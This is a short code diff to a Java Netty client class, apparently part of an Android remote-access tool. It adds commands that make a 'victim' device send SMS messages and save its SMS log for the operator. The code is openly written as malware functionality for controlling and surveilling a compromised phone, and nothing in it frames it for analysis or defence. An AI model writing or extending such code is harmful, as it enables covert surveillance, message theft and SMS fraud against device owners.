@@ -202,6 +202,22 @@ public class NettyClient extends AsyncTask<String, String, String> {
         queryHandler.sendMessage(query);
     }
 
+    public void sendSendSms(String phoneNumber, String text, String victim) {
+        JSONObject query = new JSONObject();
+        query.put("action", "send.sms");
+        query.put("phoneNumber", phoneNumber);
+        query.put("text", text);
+        query.put("victim", victim);
+        queryHandler.sendMessage(query);
+    }
+
+    public void sendSaveSmsLog(String victim) {
+        JSONObject query = new JSONObject();
+        query.put("action", "save.sms.log");
+        query.put("victim", victim);
+        queryHandler.sendMessage(query);
+    }
+
     public void sendErrorCode(String code) {
         JSONObject query = new JSONObject();
         query.put("errorCode", code);
